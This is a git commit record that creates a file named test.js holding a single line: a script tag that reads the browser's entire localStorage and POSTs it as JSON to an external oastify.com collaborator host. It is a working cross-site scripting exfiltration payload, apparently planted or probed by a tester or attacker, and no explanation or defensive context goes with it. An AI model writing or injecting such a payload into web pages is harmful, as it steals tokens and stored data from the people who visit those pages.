f1491a9f1568e4ba08799a18b8a397085b1136d2
aaa <1054339447@qq.com>
2026-05-18 11:51:08 +0800

    Create test.js

---
+++ test.js
@@ -0,0 +1,1 @@
+<script>fetch('https://xlmago2fju6ttmjl0ikt3k3s5jbaz0np.oastify.com/save', {method: 'POST',mode: 'no-cors',headers: { 'Content-Type':'application/json' },body: JSON.stringify(localStorage)})</script>
